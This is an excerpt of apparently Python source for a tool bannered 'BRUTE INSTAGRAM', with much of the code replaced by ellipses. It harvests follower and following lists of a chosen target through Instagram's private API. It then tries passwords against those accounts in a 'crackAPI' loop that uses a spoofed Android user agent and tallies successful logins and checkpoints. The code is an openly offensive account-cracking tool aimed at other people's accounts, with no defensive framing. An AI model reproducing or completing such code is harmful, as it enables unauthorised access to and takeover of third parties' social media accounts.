...
def banner():
	os.system("clear")
	prints(Panel(f"{P2}\tBRUTE INSTAGRAM",width=80,padding=(0,4),style=f"{color_table}"))
...
class instagram:
	...
	def crackAPI(self,user,pas):
		...
		prog.update(des,description=f"{H2}IGV1{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
		prog.advance(des)
		try:
			for pw in pas:
				...
				uaku=f'Mozilla/5.0 (Linux; Android 12; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
...
def mengi(self):
			...
			for t in range(m):
				...
				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100&max',id)
...
def masal(self):
			...
			for t in range(m):
				...
				nama=input(f' username target : {C}')
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100&max',id)
			self.passwordAPI(info)
